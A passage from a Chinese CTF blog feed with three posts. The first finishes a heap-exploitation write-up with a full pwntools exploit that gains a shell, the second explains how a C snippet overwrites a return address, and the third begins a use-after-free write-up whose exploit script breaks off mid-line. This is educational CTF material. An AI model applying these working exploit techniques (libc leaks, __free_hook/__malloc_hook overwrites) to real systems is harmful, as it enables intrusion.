class="keyword">return</span>;</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>由于Text结构的输入没有null截断，我们可以直接泄露libc地址</li><li>劫持Text结构体，实现任意地址读写，我们只需要提前布置好heap 结构就行</li><li>劫持hook,getshell</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch = 'i386'</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">execve_file = <span class="string">'./bookmanager'</span></span><br><span class="line">sh = process(execve_file)</span><br><span class="line"><span class="comment">#sh = remote('47.112.115.30', 13337)</span></span><br><span class="line">elf = ELF(execve_file)</span><br><span class="line"><span class="comment"># libc = ELF('./libc-2.23.so')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add_chapter</span><span class="params">(c_name)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'1'</span>)</span><br><span class="line">    sh.sendafter(<span class="string">'Chapter name:'</span>, c_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add_section</span><span class="params">(c_name, s_name)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'2'</span>)</span><br><span class="line">    sh.sendafter(<span class="string">'Which chapter do you want to add into:'</span>, c_name)</span><br><span class="line">    sh.sendafter(<span class="string">'Section name:'</span>, s_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add_text</span><span class="params">(s_name, size, text)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'3'</span>)</span><br><span class="line">    sh.sendafter(<span class="string">'Which section do you want to add into:'</span>, s_name)</span><br><span class="line">    sh.sendlineafter(<span class="string">'How many chapters you want to write:'</span>, str(size))</span><br><span class="line">    sh.sendafter(<span class="string">'Text:'</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remove_text</span><span class="params">(s_name)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'6'</span>)</span><br><span class="line">    sh.sendafter(<span class="string">'Section name:'</span>, s_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Book_preview</span><span class="params">()</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'7'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Update</span><span class="params">(s_name, text)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Your choice:'</span>, <span class="string">'8'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'hat to update?(Chapter/Section/Text):'</span>, <span class="string">'Text'</span>)</span><br><span class="line">    sh.sendafter(<span class="string">'Section name:'</span>, s_name)</span><br><span class="line">    sh.sendafter(<span class="string">'New Text:'</span>, text)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Name of the book you want to create: '</span>)</span><br><span class="line">sh.send(<span class="string">'a'</span> * <span class="number">30</span>)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">Add_chapter(<span class="string">'aaaa\n'</span>)</span><br><span class="line">Add_section(<span class="string">'aaaa\n'</span>, <span class="string">'bbbb\n'</span>)</span><br><span class="line">Add_section(<span class="string">'aaaa\n'</span>, <span class="string">'cccc\n'</span>)</span><br><span class="line">Add_text(<span class="string">'bbbb\n'</span>, <span class="number">0x88</span>, <span class="string">'\n'</span>)</span><br><span class="line">Add_text(<span class="string">'cccc\n'</span>, <span class="number">0x68</span>, <span class="string">'here\n'</span>)</span><br><span class="line"></span><br><span class="line">Remove_text(<span class="string">'bbbb\n'</span>)</span><br><span class="line">Add_text(<span class="string">'bbbb\n'</span>, <span class="number">0x88</span>, <span class="string">'\x78'</span>)</span><br><span class="line">Book_preview()</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Section:bbbb'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Text:'</span>)</span><br><span class="line"></span><br><span class="line">result = sh.recvline()[:<span class="number">-1</span>]</span><br><span class="line">main_arena_addr = u64(result.ljust(<span class="number">8</span>, <span class="string">'\0'</span>)) - <span class="number">88</span></span><br><span class="line">log.success(<span class="string">'main_arena_addr: '</span> + hex(main_arena_addr))</span><br><span class="line"></span><br><span class="line">libc_addr = main_arena_addr - (libc.symbols[<span class="string">'__malloc_hook'</span>] + <span class="number">0x10</span>)</span><br><span class="line">log.success(<span class="string">'libc_addr: '</span> + hex(libc_addr))</span><br><span class="line"></span><br><span class="line">Add_section(<span class="string">'aaaa\n'</span>, <span class="string">'dddd\n'</span>)</span><br><span class="line">Update(<span class="string">'cccc\n'</span>, <span class="string">'/bin/sh\0'</span>.ljust(<span class="number">0x60</span>, <span class="string">'\0'</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>) + <span class="string">'dddd'</span>.ljust(<span class="number">0x20</span>, <span class="string">'\0'</span>) + p64(libc_addr + libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">Update(<span class="string">'dddd\n'</span>, p64(libc_addr + libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">Remove_text(<span class="string">'cccc\n'</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">clear()</span><br></pre></td></tr></table></figure><h3 id="hub"><a href="#hub" class="headerlink" title="hub"></a>hub</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pwn&quot; class=&quot;headerlink&quot; title=&quot;pwn&quot;&gt;&lt;/a&gt;pwn&lt;/h1&gt;&lt;h2 id=&quot;babyrop&quot;&gt;&lt;a href=&quot;#babyrop&quot; class=&quot;headerlink&quot; title=&quot;babyrop
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>一段有趣的c语言代码</title>
    <link href="https://nocbtm.github.io/2019/10/10/%E4%B8%80%E6%AE%B5%E6%9C%89%E8%B6%A3%E7%9A%84c%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81/"/>
    <id>https://nocbtm.github.io/2019/10/10/一段有趣的c语言代码/</id>
    <published>2019-10-10T10:54:55.000Z</published>
    <updated>2019-10-10T12:36:07.158Z</updated>
    
    <content type="html"><![CDATA[<p>今天看到一段有趣的c代码，如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">function</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *ret;</span><br><span class="line">ret=&amp;a<span class="number">-1</span>;</span><br><span class="line">(*ret)+=<span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line">x=<span class="number">0</span>;</span><br><span class="line">function(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">x=<span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"x is %d\n"</span>,x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>群里的人讨论最终输出x的值是0还是1呐?</p><p>经过我的测试，编译成32位的程序x是0,而64位的是1<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ gcc text.c -o text_64</span><br><span class="line">$ gcc text.c -o text_32 -m32</span><br><span class="line">$ ./text_32 </span><br><span class="line">x is 0</span><br><span class="line">$ ./text_64 </span><br><span class="line">x is 1</span><br></pre></td></tr></table></figure></p><p>这是为什么呐?我决定用gdb调一下，先调一下32位的程序<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">0x08048445 <span class="keyword">in</span> main ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0xf7f90dbc (environ) —▸ 0xffffcd1c —▸ 0xffffcf56 ◂— <span class="string">'XDG_VTNR=7'</span></span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffcc80 ◂— 0x1</span><br><span class="line"> EDX  0xffffcca4 ◂— 0x0</span><br><span class="line"> EDI  0xf7f8f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> ESI  0xf7f8f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> EBP  0xffffcc68 ◂— 0x0</span><br><span class="line"> ESP  0xffffcc44 ◂— 0x1</span><br><span class="line"> EIP  0x8048445 (main+30) —▸ 0xffffc1e8 ◂— 0x0</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x8048435 &lt;main+14&gt;    sub    esp, 0x14</span><br><span class="line">   0x8048438 &lt;main+17&gt;    mov    dword ptr [ebp - 0xc], 0</span><br><span class="line">   0x804843f &lt;main+24&gt;    push   3</span><br><span class="line">   0x8048441 &lt;main+26&gt;    push   2</span><br><span class="line">   0x8048443 &lt;main+28&gt;    push   1</span><br><span class="line"> ► 0x8048445 &lt;main+30&gt;    call   <span class="keyword">function</span> &lt;0x804840b&gt;</span><br><span class="line">        arg0: 0x1</span><br><span class="line"> </span><br><span class="line">   0x804844a &lt;main+35&gt;    add    esp, 0xc</span><br><span class="line">   0x804844d &lt;main+38&gt;    mov    dword ptr [ebp - 0xc], 1</span><br><span class="line">   0x8048454 &lt;main+45&gt;    sub    esp, 8</span><br><span class="line">   0x8048457 &lt;main+48&gt;    push   dword ptr [ebp - 0xc]</span><br><span class="line">   0x804845a &lt;main+51&gt;    push   0x80484f0</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffcc44 ◂— 0x1</span><br><span class="line">01:0004│      0xffffcc48 ◂— 0x2</span><br><span class="line">02:0008│      0xffffcc4c ◂— 0x3</span><br><span class="line">03:000c│      0xffffcc50 ◂— 0x1</span><br><span class="line">04:0010│      0xffffcc54 —▸ 0xffffcd14 —▸ 0xffffcf13 ◂— 0x6d6f682f (<span class="string">'/hom'</span>)</span><br><span class="line">05:0014│      0xffffcc58 —▸ 0xffffcd1c —▸ 0xffffcf56 ◂— <span class="string">'XDG_VTNR=7'</span></span><br><span class="line">06:0018│      0xffffcc5c ◂— 0x0</span><br><span class="line">07:001c│      0xffffcc60 —▸ 0xf7f8f3dc (__exit_funcs) —▸ 0xf7f901e0 (initial) ◂— 0x0</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0  8048445 main+30</span><br><span class="line">   f 1 f7df5637 __libc_start_main+247</span><br><span class="line">pwndbg&gt; n</span><br><span class="line">x is 0</span><br><span class="line">[Inferior 1 (process 10680) exited with code 07]</span><br></pre></td></tr></table></figure></p><p>纳尼，程序执行完function函数之后，就输出x的值了，并退出了。<br>看来我之前的思路完全错了，我还以为那个函数把1修改为0了，看来是劫持了程序的执行流，跳过了x=1;这个语句</p><p>接下里就分析一下那个函数是如何劫持程序执行流的,进入function函数进行调试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">0x08048422 in function ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0xffffcc40 —▸ 0x804844a (main+35) ◂— add    esp, 0xc</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffcc80 ◂— 0x1</span><br><span class="line"> EDX  0x8048452 (main+43) ◂— add    byte ptr [eax], al</span><br><span class="line"> EDI  0xf7f8f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> ESI  0xf7f8f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> EBP  0xffffcc3c —▸ 0xffffcc68 ◂— 0x0</span><br><span class="line"> ESP  0xffffcc2c —▸ 0xf7fd3388 —▸ 0xf7ddd000 ◂— jg     0xf7ddd047</span><br><span class="line"> EIP  0x8048422 (function+23) ◂— mov    dword ptr [eax], edx</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x8048414 &lt;function+9&gt;     mov    dword ptr [ebp - 4], eax</span><br><span class="line">   0x8048417 &lt;function+12&gt;    mov    eax, dword ptr [ebp - 4]</span><br><span class="line">   0x804841a &lt;function+15&gt;    mov    eax, dword ptr [eax]</span><br><span class="line">   0x804841c &lt;function+17&gt;    lea    edx, [eax + 8]</span><br><span class="line">   0x804841f &lt;function+20&gt;    mov    eax, dword ptr [ebp - 4]</span><br><span class="line"> ► 0x8048422 &lt;function+23&gt;    mov    dword ptr [eax], edx &lt;0x8048452&gt;  ##这里是关键</span><br><span class="line">   0x8048424 &lt;function+25&gt;    nop    </span><br><span class="line">   0x8048425 &lt;function+26&gt;    leave  </span><br><span class="line">   0x8048426 &lt;function+27&gt;    ret    </span><br><span class="line">    ↓</span><br><span class="line">   0x8048452 &lt;main+43&gt;        add    byte ptr [eax], al</span><br><span class="line">   0x8048454 &lt;main+45&gt;        sub    esp, 8</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffcc2c —▸ 0xf7fd3388 —▸ 0xf7ddd000 ◂— jg     0xf7ddd047</span><br><span class="line">01:0004│      0xffffcc30 ◂— 0x8000</span><br><span class="line">02:0008│      0xffffcc34 —▸ 0xf7f8f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line">03:000c│      0xffffcc38 —▸ 0xffffcc40 —▸ 0x804844a (main+35) ◂— add    esp, 0xc</span><br><span class="line">04:0010│ ebp  0xffffcc3c —▸ 0xffffcc68 ◂— 0x0</span><br><span class="line">05:0014│ eax  0xffffcc40 —▸ 0x804844a (main+35) ◂— add    esp, 0xc</span><br><span class="line">06:0018│      0xffffcc44 ◂— 0x1</span><br><span class="line">07:001c│      0xffffcc48 ◂— 0x2</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0  8048422 function+23</span><br><span class="line">   f 1  804844a main+35</span><br><span class="line">   f 2 f7df5637 __libc_start_main+247</span><br></pre></td></tr></table></figure></p><p>可以看到下面这句汇编把eax寄存器指向的地址0x804844a (main+35)修改为了0x8048452<br>0x8048422 &lt;function+23&gt;    mov    dword ptr [eax], edx <0x8048452></0x8048452></p><p>我们配合着mian函数的汇编来看一下，0x8048844a这个地址是调用完function函数的下一个地址，也就相当于function的函数返回地址;<br>但是这里被修改成了0x8048452，那这样就造成了执行完function函数之后，就跳转到0x8048452这个地址继续执行;<br>从而跳过了0x0804844d &lt;+38&gt;:    mov    DWORD PTR [ebp-0xc],0x1 这个赋值语句<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">disassemble main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x08048427 &lt;+0&gt;:lea    ecx,[esp+0x4]</span><br><span class="line">   0x0804842b &lt;+4&gt;:and    esp,0xfffffff0</span><br><span class="line">   0x0804842e &lt;+7&gt;:push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x08048431 &lt;+10&gt;:push   ebp</span><br><span class="line">   0x08048432 &lt;+11&gt;:mov    ebp,esp</span><br><span class="line">   0x08048434 &lt;+13&gt;:push   ecx</span><br><span class="line">   0x08048435 &lt;+14&gt;:sub    esp,0x14</span><br><span class="line">   0x08048438 &lt;+17&gt;:mov    DWORD PTR [ebp-0xc],0x0</span><br><span class="line">   0x0804843f &lt;+24&gt;:push   0x3</span><br><span class="line">   0x08048441 &lt;+26&gt;:push   0x2</span><br><span class="line">   0x08048443 &lt;+28&gt;:push   0x1</span><br><span class="line">   0x08048445 &lt;+30&gt;:call   0x804840b &lt;<span class="keyword">function</span>&gt;</span><br><span class="line">   0x0804844a &lt;+35&gt;:add    esp,0xc</span><br><span class="line">   0x0804844d &lt;+38&gt;:mov    DWORD PTR [ebp-0xc],0x1</span><br><span class="line">   0x08048454 &lt;+45&gt;:sub    esp,0x8</span><br><span class="line">   0x08048457 &lt;+48&gt;:push   DWORD PTR [ebp-0xc]</span><br><span class="line">   0x0804845a &lt;+51&gt;:push   0x80484f0</span><br><span class="line">   0x0804845f &lt;+56&gt;:call   0x80482e0 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">   0x08048464 &lt;+61&gt;:add    esp,0x10</span><br><span class="line">   0x08048467 &lt;+64&gt;:nop</span><br><span class="line">   0x08048468 &lt;+65&gt;:mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x0804846b &lt;+68&gt;:leave  </span><br><span class="line">   0x0804846c &lt;+69&gt;:lea    esp,[ecx-0x4]</span><br><span class="line">   0x0804846f &lt;+72&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></p><p>现在就很明显了，0x8048452-0x8048844a=8;</p><p>从c语言的角度来看ret=&amp;a-1;这句话就是取栈中 函数第一个参数 上面的函数返回地址的 <strong>地址指针</strong>；<br>注意运算符优先级，先算术运算，后移位运算，最后位运算；ret=&amp;(a-1)<br>然后(*ret)+=8，函数返回地址再加8，劫持了程序执行流。<br>这个程序加8不是很好，应该改为加10更为严谨；</p><p>而64位程序是通过寄存器来传参的，ret取到的不是函数返回地址，就没办法劫持程序执行流了</p><p>64位的程序就不在演示调试了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天看到一段有趣的c代码，如下:&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/s
      
    
    </summary>
    
      <category term="c" scheme="https://nocbtm.github.io/categories/c/"/>
    
    
      <category term="c" scheme="https://nocbtm.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>第五空间线下pwn部分writeup</title>
    <link href="https://nocbtm.github.io/2019/10/05/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8Bpwn%E9%83%A8%E5%88%86writeup/"/>
    <id>https://nocbtm.github.io/2019/10/05/第五空间线下pwn部分writeup/</id>
    <published>2019-10-05T09:59:36.000Z</published>
    <updated>2019-10-08T10:24:56.631Z</updated>
    
    <content type="html"><![CDATA[<h2 id="壹業"><a href="#壹業" class="headerlink" title="壹業"></a>壹業</h2><p>标准的UAF漏洞题</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>创建unsortedbin的chunk,free掉，然后再show，就能泄露libc地址</li><li>复写malloc_hook为one_gadget</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>本地环境：ubuntu 16.04<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r=process(<span class="string">'./pwn1'</span>)</span><br><span class="line"><span class="comment">#r=remote('0.0.0.0',10000)</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">libc_off = <span class="number">0x7f7436b23b78</span><span class="number">-0x7f743675f000</span></span><br><span class="line">onegadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(libc_off)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,cont)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.sendline(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'4'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0xa0</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#5</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">leak=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(hex(leak))</span><br><span class="line"></span><br><span class="line">libc.address = leak- libc_off</span><br><span 